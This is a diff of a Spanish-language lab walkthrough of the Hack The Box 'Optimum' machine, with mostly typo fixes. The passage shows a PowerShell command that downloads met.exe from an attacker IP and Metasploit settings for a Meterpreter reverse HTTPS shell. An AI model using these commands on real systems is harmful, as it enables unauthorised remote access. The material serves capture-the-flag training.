@@ -81,7 +81,7 @@ Para comenzar a enumerar posibles vectores de escalada de privilegios hemos ejec
 
 Algo de lo que deberíamos de darnos cuenta es de que la herramienta Watson no muestra ninguna salida al ejecutar WinPEAS.
 
-Esto se debe a que la versión .NET del host no permite el uso de Watson (se necesita como mínimo la versión 4.5). Para comprobarlo podemos consultar los directorios de la siguiente ruta
+Esto se debe a que la versión .NET del host no permite el uso de Watson (se necesita como mínimo la versión 4.5). Para comprobarlo podemos consultar los directorios de la siguiente ruta:
 
 ![image-left](https://haoxgit.github.io/haox/assets/images/optimum/net.png){: .align-center}
 
@@ -97,16 +97,16 @@ Para compartir la shell podemos ejecutar un servidor http con python
 python3 -m http.server 80
 ```
 
-Aprovechando la shell PS que ya tenemos descargamos sherlock del siguiente modo
+Aprovechando la shell PS que ya tenemos descargamos el payload del siguiente modo
 ```
 iwr -uri http://10.10.14.10/met.exe -outfile met.exe
 ```
 
-Por parte de nuestra maquina atacante a la escucha deberemos de utilizar el multi/handler de msfconsole y definir los siguientes parámetros.
+Por parte de nuestra máquina atacante a la escucha deberemos de utilizar el multi/handler de msfconsole y definir los siguientes parámetros.
 ```
 set lhost <IP de nuestra máquina atacante>
 
-set lport <puerto a la escuhca de nuestra máquina atacante>
+set lport <puerto a la escucha de nuestra máquina atacante>
 
 set payload windows/x64/meterpreter_reverse_https
 ```
